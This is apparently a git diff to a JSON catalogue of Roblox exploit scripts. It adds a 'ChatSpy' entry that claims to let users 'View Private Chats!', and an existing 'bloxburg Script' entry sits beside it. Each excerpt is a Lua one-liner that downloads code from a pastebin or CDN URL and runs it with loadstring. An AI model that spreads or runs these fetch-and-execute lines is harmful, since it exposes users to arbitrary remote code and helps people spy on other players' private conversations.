@@ -1,5 +1,15 @@
 [
 {
+    "id": 95,
+    "title": "ChatSpy",
+    "excerpt": "loadstring(game:HttpGet(\"https://pastebin.com/raw/Kph916LG\", true))()",
+    "date": "View Private Chats!",
+    "slug": "yikes-eaea",
+    "featured_image": {
+      "thumbnail": "https://i.imgur.com/qFohnwQ.png"
+    }  
+  },  
+{
     "id": 94,
     "title": "bloxburg Script",
     "excerpt": "loadstring(game:HttpGet(\"https://cdn.applebee1558.com/alphax/AlphaX.lua\", true))()",
